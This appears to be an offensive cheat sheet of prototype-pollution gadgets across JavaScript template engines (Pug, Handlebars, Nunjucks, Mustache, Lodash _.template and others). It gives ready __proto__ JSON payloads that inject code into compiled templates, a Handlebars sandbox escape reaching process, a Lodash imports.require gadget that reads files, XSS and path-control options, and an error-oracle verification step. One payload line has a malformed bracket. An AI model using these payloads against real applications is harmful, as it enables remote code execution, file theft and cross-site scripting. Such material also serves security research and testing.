# Template gadgets — the other engines' compile-time sinks

EJS is the headline, but every template engine that compiles options
into code has the same class of sink. Per-engine: the option names
that land in generated code, the option names that change resolution,
and the confirmed shapes.

---

## 1. Pug (Jade)

Pug compiles via `pug.compile(source, options)` → `new Function`.

| Option | Sink |
|---|---|
| `filename` | the template's filename used in errors and `include`/`extends` resolution — path control |
| `basedir` | root for absolute includes — `include /etc/passwd` resolution |
| `filters` | `options.filters` map — register a filter name that's a `Function` call |
| `globals` | `options.globals` — inject a global NAME into the generated function's scope list |
| `self` | `options.self === true` rebinds the locals object |
| `compileDebug` | adds source maps — info leak |
| `inlineRuntimeFunctions` | changes generated shape |
| `name` | the compiled function's name — raw JS injection like `outputFunctionName` |

The `name` and `globals` fields are the EJS-`outputFunctionName`
equivalents — string fields concatenated into `new Function` body.

```json
{"__proto__": {"name": "x;CODE;var y"}}
{"__proto__": {"globals": ["x;CODE;var y"]}}
{"__proto__": {"basedir": "/"}}
{"__proto__": {"filename": "/etc/passwd"}}
```

## 2. Handlebars

Handlebars compiles `Handlebars.compile(tpl, options)` — the options
are less code-shaped, but the HELPER and DECORATOR lookup paths are
the sink.

| Field | Sink |
|---|---|
| `helpers` | `options.helpers` — a helper map; `{{helper arg}}` invokes it. Pollute a helper NAME the template calls |
| `partials` | partial map — a partial name resolving to attacker content |
| `decorators` | decorator map — same surface |
| `data`/`blockParams`/`knownHelpers` | compile-time lookups — `knownHelpers` can mark a helper "known" and skip the runtime guard |
| `allowProtoPropertiesByDefault` | the literal switch — `true` lets templates READ `__proto__`/`constructor` fields (proto-property access) |
| `allowProtoMethodsByDefault` | the method-access twin — `{{this.constructor}}` works |
| `compat`/`mustard`/`stringParams`/`trackIds` | feature flips |

`allowProtoMethodsByDefault`/`allowProtoPropertiesByDefault` are the
special pair: polluting them to `true` turns a previously-safe
template into a sandbox escape — `{{this.constructor.constructor
('return process')()}}` becomes callable. The classic
"pollute the flag that unlocks the real attack" chain.

## 3. Nunjucks (Jinja2-for-JS)

```json
{"__proto__": {"autoescape": false}}
{"__proto__": {"throwOnUndefined": true}}
{"__proto__": {"tags": {"blockStart": "<%", "variableStart": "[["}}}
{"__proto__": {"extensions": {"MyExt": "/path/to/ext.js"}}}
{"__proto__": {"loader": {"searchPaths": ["/etc"]}}}
```

| Option | Sink |
|---|---|
| `autoescape` | `false` → XSS by default |
| `tags` | re-marker the syntax — confusion payloads |
| `extensions`/`loaders` | extension/file loading — path control |
| `throwOnUndefined`/`dev` | error verbosity |
| `env.globals`/`env.filters` | registered names — inject a callable |

## 4. Mustache / Hogan / Hogan-express

Mustache is "logic-less" — no `<% code %>`, but the option surface
still leaks:

```json
{"__proto__": {"delimiters": ["<%", "%>"]}}
{"__proto__": {"partials": {"x": "ATTACKER_CONTENT"}}}
{"__proto__": {"tags": ["[[", "]]"]]}}
```

- `partials`: inject a partial by name — the main template's
  `{{> x}}` renders YOUR content (stored XSS or template-confusion).
- `delimiters`/`tags`: re-marker — the template's own `{{}}` stop
  parsing, or your `<% %>` start.

## 5. Lodash `_.template` — the sleeper

`_.template(str, options)` compiles with `options` including:

| Option | Sink |
|---|---|
| `imports` | `options.imports = {"require": require}` — inject a NAME into template scope; `<%= require('fs').readFileSync('/flag') %>` inside the template now resolves |
| `variable` | `options.variable` — the data object's name in the generated function |
| `evaluate`/`interpolate`/`escape` | the regexes the compiler uses — a polluted regex redefines the syntax |
| `sourceURL` | appended to generated code — script context |

`imports.require` is the canonical gadget: pollute
`__proto__.imports.require` and every `_.template` call that reads
the default option picks up `require` inside its scope.

## 6. doT / Dust / ect / marko / eta

The same three option classes recur:

- **Name-in-code fields** (`functionName`, `name`, `varname`) — raw-JS
  injection like `outputFunctionName`.
- **Path fields** (`root`, `views`, `filename`, `basedir`, `viewsDir`)
  — resolution control.
- **Helper/extension maps** (`helpers`, `filters`, `extensions`,
  `tags`) — name-keyed callables your pollution supplies.

The per-engine survey: find `compile(`/`render(`/`template(` calls in
source, read the option object, grep its option-name strings against
this list.

## 7. The template-data variant

Not the options — the DATA. `engine.render(tpl, data)` where `data`
itself is polluted via `__proto__`: the template's `<%= user.name %>`
reads `data.user.name` — if the template iterates `data`'s keys, your
`__proto__` keys surface too. A for-in loop over data is a
proto-key leak channel (the template enumerates inherited keys).

## 8. Verification per engine

```bash
# the option lands
POST /render {"engine":"ejs","opts":{"__proto__":{"outputFunctionName":"x;CODE;var y"}}}
# the render fires the generated code — marker in HTML
GET /rendered → "[PP]..."
```

The response 500-vs-200 split on a syntax-broken payload is the
oracle: a 500 after your `x;BAD;var y` proves the field reached the
generated code — fix the syntax and the marker lands.
